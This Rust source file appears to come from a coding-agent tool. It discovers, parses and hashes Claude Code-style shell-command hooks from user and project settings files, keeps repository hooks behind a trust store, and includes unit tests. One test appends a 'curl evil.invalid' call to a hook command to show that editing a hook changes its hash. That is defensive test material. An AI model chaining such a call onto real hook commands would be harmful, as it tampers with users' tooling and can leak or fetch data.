//! Hook definitions, read from the files Claude Code reads.
//!
//! A hook is a shell command the engine runs at a fixed point of a turn. The
//! file shape is Claude Code's, so a hook written for it works here without
//! being converted:
//!
//! ```json
//! {"hooks": {"PreToolUse": [{"matcher": "Bash|Edit",
//!   "hooks": [{"type": "command", "command": "./check.sh", "timeout": 30}]}]}}
//! ```
//!
//! This module only *reads and describes*. Whether a definition may run is
//! decided by the surface — user files always, project files only once the
//! user's [`crate::trust`] store holds the definition's hash — and the engine
//! is handed the approved list. Nothing here executes anything.

use std::path::Path;

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

/// File names, relative to their root, in the order they are read. User files
/// sit under the agent directory (and, when asked for, `~/.claude`); project
/// files under the workspace.
pub const USER_FILE: &str = "hooks.json";
pub const FOREIGN_USER_FILE: &str = ".claude/settings.json";
pub const PROJECT_FILES: [&str; 3] = [
    ".titi/hooks.json",
    ".claude/settings.json",
    ".claude/settings.local.json",
];

/// The user setting that lets `~/.claude/settings.json` hooks run. Read from
/// the user's own layers only: a repository cannot opt the user in.
pub const FOREIGN_USER_KEY: &str = "hooks.foreignUserConfig";

/// The points of a turn a hook can attach to. Claude Code has more; these are
/// the ones titi runs, and an event this list lacks is not an error in a
/// shared settings file, only not acted on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum HookEvent {
    PreToolUse,
    PostToolUse,
    UserPromptSubmit,
    Stop,
    SessionStart,
}

impl HookEvent {
    pub const ALL: [HookEvent; 5] = [
        HookEvent::PreToolUse,
        HookEvent::PostToolUse,
        HookEvent::UserPromptSubmit,
        HookEvent::Stop,
        HookEvent::SessionStart,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            HookEvent::PreToolUse => "PreToolUse",
            HookEvent::PostToolUse => "PostToolUse",
            HookEvent::UserPromptSubmit => "UserPromptSubmit",
            HookEvent::Stop => "Stop",
            HookEvent::SessionStart => "SessionStart",
        }
    }

    pub fn parse(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|event| event.as_str() == name)
    }
}

/// One command hook, as a file defined it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HookDef {
    pub event: HookEvent,
    /// Tool names (`Bash|Edit`), or a regular expression, that the hook
    /// applies to. `None`, empty and `*` match everything. Only the tool
    /// events look at it.
    #[serde(default)]
    pub matcher: Option<String>,
    pub command: String,
    /// Seconds the command may run; the runner's default when `None`.
    #[serde(default)]
    pub timeout_secs: Option<u64>,
    /// The file it came from, for a person to read. Not part of the
    /// definition: moving a hook between files does not change what it does.
    #[serde(default)]
    pub source: String,
}

impl HookDef {
    /// What the definition says, and only that: the input of its hash.
    pub fn definition(&self) -> Value {
        json!({
            "event": self.event.as_str(),
            "matcher": self.matcher.as_deref().unwrap_or(""),
            "type": "command",
            "command": self.command,
            "timeout": self.timeout_secs,
        })
    }

    pub fn hash(&self) -> String {
        crate::trust::hash_definition(&self.definition())
    }

    /// The short name a transcript row calls the hook by: the program the
    /// command starts with, without its directory (`./scripts/lint.sh a b`
    /// reads `lint.sh`).
    pub fn display_name(&self) -> String {
        let program = self.command.split_whitespace().next().unwrap_or("");
        let name = program.rsplit('/').next().unwrap_or(program);
        if name.is_empty() {
            self.command.chars().take(24).collect()
        } else {
            name.to_owned()
        }
    }
}

/// Everything the hook files define, before anyone has decided what may run.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Discovered {
    /// From the user's own files: they run unconditionally.
    pub user: Vec<HookDef>,
    /// From the repository: they run only once trusted.
    pub project: Vec<HookDef>,
    /// One line per file that could not be read or part of one that was
    /// skipped, so a hook that does not run is never silent.
    pub notices: Vec<String>,
}

/// Reads every hook file. `foreign_home` is the user's home directory when
/// `hooks.foreignUserConfig` is on, and `None` leaves `~/.claude` unread.
pub fn discover(agent_dir: &Path, workspace: &Path, foreign_home: Option<&Path>) -> Discovered {
    let mut found = Discovered::default();
    let mut user_sources = vec![(agent_dir.join(USER_FILE), "hooks.json".to_owned())];
    if let Some(home) = foreign_home {
        user_sources.push((
            home.join(FOREIGN_USER_FILE),
            format!("~/{FOREIGN_USER_FILE}"),
        ));
    }
    for (path, label) in user_sources {
        read_into(&path, &label, &mut found.user, &mut found.notices);
    }
    for file in PROJECT_FILES {
        read_into(
            &workspace.join(file),
            file,
            &mut found.project,
            &mut found.notices,
        );
    }
    found
}

fn read_into(path: &Path, label: &str, into: &mut Vec<HookDef>, notices: &mut Vec<String>) {
    let text = match std::fs::read_to_string(path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return,
        Err(error) => {
            notices.push(format!("hooks: could not read {label}: {error}"));
            return;
        }
    };
    let (defs, skipped) = match parse(&text, label) {
        Ok(parsed) => parsed,
        Err(reason) => {
            notices.push(format!("hooks: {label} is not read: {reason}"));
            return;
        }
    };
    notices.extend(skipped);
    for def in defs {
        // The same hook in `settings.json` and `settings.local.json` is one
        // hook, not two runs.
        if !into
            .iter()
            .any(|known| known.definition() == def.definition())
        {
            into.push(def);
        }
    }
}

/// Parses one file's text. The `Err` is a file that is not hook JSON at all;
/// the second half of `Ok` names the handlers that were skipped.
pub fn parse(text: &str, source: &str) -> Result<(Vec<HookDef>, Vec<String>), String> {
    let root: Value = serde_json::from_str(text).map_err(|error| error.to_string())?;
    let Some(hooks) = root.get("hooks") else {
        // A settings file with no hooks is the common case in `.claude`.
        return Ok((Vec::new(), Vec::new()));
    };
    let Some(events) = hooks.as_object() else {
        return Err("`hooks` is not an object".to_owned());
    };
    let mut defs = Vec::new();
    let mut skipped = Vec::new();
    for (name, groups) in events {
        // An event titi does not run (`Notification`, `SubagentStop`…) is not
        // a mistake in a file shared with Claude Code.
        let Some(event) = HookEvent::parse(name) else {
            continue;
        };
        let Some(groups) = groups.as_array() else {
            skipped.push(format!("hooks: {source}: {name} is not a list"));
            continue;
        };
        for group in groups {
            let matcher = group
                .get("matcher")
                .and_then(Value::as_str)
                .map(str::to_owned)
                .filter(|matcher| !matcher.is_empty() && matcher != "*");
            let Some(handlers) = group.get("hooks").and_then(Value::as_array) else {
                skipped.push(format!(
                    "hooks: {source}: a {name} entry has no `hooks` list"
                ));
                continue;
            };
            for handler in handlers {
                let kind = handler
                    .get("type")
                    .and_then(Value::as_str)
                    .unwrap_or("command");
                let command = handler
                    .get("command")
                    .and_then(Value::as_str)
                    .map(str::trim);
                let has_args = handler
                    .get("args")
                    .and_then(Value::as_array)
                    .is_some_and(|args| !args.is_empty());
                match (kind, command) {
                    ("command", Some(command)) if !command.is_empty() && !has_args => {
                        defs.push(HookDef {
                            event,
                            matcher: matcher.clone(),
                            command: command.to_owned(),
                            timeout_secs: handler.get("timeout").and_then(Value::as_u64),
                            source: source.to_owned(),
                        });
                    }
                    ("command", _) if has_args => skipped.push(format!(
                        "hooks: {source}: a {name} hook with `args` is skipped (only shell command strings run)"
                    )),
                    ("command", _) => {
                        skipped.push(format!("hooks: {source}: a {name} hook has no command"));
                    }
                    (other, _) => skipped.push(format!(
                        "hooks: {source}: a {name} hook of type {other:?} is skipped (only command hooks run)"
                    )),
                }
            }
        }
    }
    Ok((defs, skipped))
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"{"hooks": {
        "PreToolUse": [{"matcher": "Bash|Edit", "hooks": [
            {"type": "command", "command": "./scripts/lint.sh --fast", "timeout": 30}]}],
        "Stop": [{"hooks": [{"type": "command", "command": "notify.sh"}]}],
        "Notification": [{"hooks": [{"type": "command", "command": "ignored.sh"}]}]
    }}"#;

    #[test]
    fn a_claude_shaped_file_yields_its_command_hooks() {
        let (defs, skipped) = parse(SAMPLE, ".claude/settings.json").unwrap();
        assert!(skipped.is_empty(), "{skipped:?}");
        assert_eq!(defs.len(), 2, "Notification is not an event titi runs");
        let pre = defs
            .iter()
            .find(|d| d.event == HookEvent::PreToolUse)
            .unwrap();
        assert_eq!(pre.matcher.as_deref(), Some("Bash|Edit"));
        assert_eq!(pre.timeout_secs, Some(30));
        assert_eq!(pre.display_name(), "lint.sh");
        let stop = defs.iter().find(|d| d.event == HookEvent::Stop).unwrap();
        assert_eq!(stop.matcher, None);
    }

    #[test]
    fn handlers_titi_cannot_run_are_named_not_dropped_silently() {
        let text = r#"{"hooks": {"PostToolUse": [{"hooks": [
            {"type": "prompt", "prompt": "is it ok?"},
            {"type": "command", "command": "a.sh", "args": ["--x"]},
            {"type": "command"}]}]}}"#;
        let (defs, skipped) = parse(text, "f").unwrap();
        assert!(defs.is_empty());
        assert_eq!(skipped.len(), 3, "{skipped:?}");
    }

    #[test]
    fn a_settings_file_without_hooks_is_empty_and_bad_json_is_an_error() {
        assert_eq!(parse(r#"{"model": "x"}"#, "f").unwrap().0, vec![]);
        assert!(parse("{nope", "f").is_err());
        assert!(parse(r#"{"hooks": []}"#, "f").is_err());
    }

    #[test]
    fn the_hash_follows_the_definition_not_the_file() {
        let (mut defs, _) = parse(SAMPLE, ".claude/settings.json").unwrap();
        let before = defs[0].hash();
        defs[0].source = ".titi/hooks.json".to_owned();
        assert_eq!(before, defs[0].hash(), "moving a hook changes nothing");
        defs[0].command.push_str(" && curl evil.invalid");
        assert_ne!(before, defs[0].hash(), "editing it does");
    }

    #[test]
    fn user_and_project_files_are_kept_apart_and_foreign_home_is_opt_in() {
        let agent = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        std::fs::write(agent.path().join(USER_FILE), SAMPLE).unwrap();
        std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
        std::fs::write(repo.path().join(".claude/settings.json"), SAMPLE).unwrap();
        std::fs::write(repo.path().join(".claude/settings.local.json"), SAMPLE).unwrap();
        std::fs::create_dir_all(home.path().join(".claude")).unwrap();
        std::fs::write(
            home.path().join(".claude/settings.json"),
            r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "mine.sh"}]}]}}"#,
        )
        .unwrap();

        let off = discover(agent.path(), repo.path(), None);
        assert_eq!(off.user.len(), 2);
        assert_eq!(
            off.project.len(),
            2,
            "the local file repeats the shared one"
        );
        assert_eq!(off.project[0].source, ".claude/settings.json");

        let on = discover(agent.path(), repo.path(), Some(home.path()));
        assert_eq!(on.user.len(), 3);
        assert!(on.user.iter().any(|d| d.command == "mine.sh"));
    }

    #[test]
    fn an_unreadable_file_leaves_a_notice() {
        let agent = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        std::fs::write(agent.path().join(USER_FILE), "{oops").unwrap();
        let found = discover(agent.path(), repo.path(), None);
        assert!(found.user.is_empty());
        assert_eq!(found.notices.len(), 1);
        assert!(found.notices[0].contains("hooks.json"));
    }
}
